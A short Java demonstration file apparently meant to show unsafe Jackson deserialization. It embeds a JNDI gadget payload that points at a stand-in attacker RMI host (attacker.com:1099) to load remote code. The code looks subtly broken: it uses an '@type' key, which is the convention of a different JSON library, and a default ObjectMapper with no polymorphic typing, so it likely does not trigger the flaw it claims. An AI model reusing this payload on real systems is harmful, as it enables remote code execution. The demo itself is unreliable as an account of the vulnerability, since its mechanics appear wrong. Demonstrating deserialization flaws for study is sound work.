import com.fasterxml.jackson.databind.ObjectMapper;

public class VulnerableJackson {
    public static void main(String[] args) {
        try {
            // Malicious JSON payload
            String json = "{ \"@type\": \"org.apache.commons.configuration.JNDIConfiguration\", \"resourceName\": \"rmi://attacker.com:1099/Exploit\" }";

            // ObjectMapper without proper security configurations
            ObjectMapper mapper = new ObjectMapper();
            Object obj = mapper.readValue(json, Object.class); // Unsafe deserialization
            System.out.println("Deserialized object: " + obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
